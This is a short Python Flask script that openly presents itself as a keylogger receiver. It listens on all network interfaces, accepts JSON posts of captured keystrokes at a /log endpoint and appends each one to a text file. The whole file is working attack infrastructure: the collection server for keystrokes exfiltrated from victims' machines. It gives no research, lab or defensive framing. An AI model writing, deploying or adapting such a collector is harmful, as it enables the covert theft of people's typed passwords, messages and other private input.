from flask import Flask, request

app = Flask(__name__)
log_file = "received_keystrokes.txt"

@app.route('/')
def home():
    return "Keylogger receiver running"

@app.route('/log', methods=['POST'])
def log_keystroke():
    data = request.get_json()
    if data and 'key' in data:
        with open(log_file, 'a') as f:
            f.write(data['key'])
        return 'OK', 200
    return 'Bad Request', 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
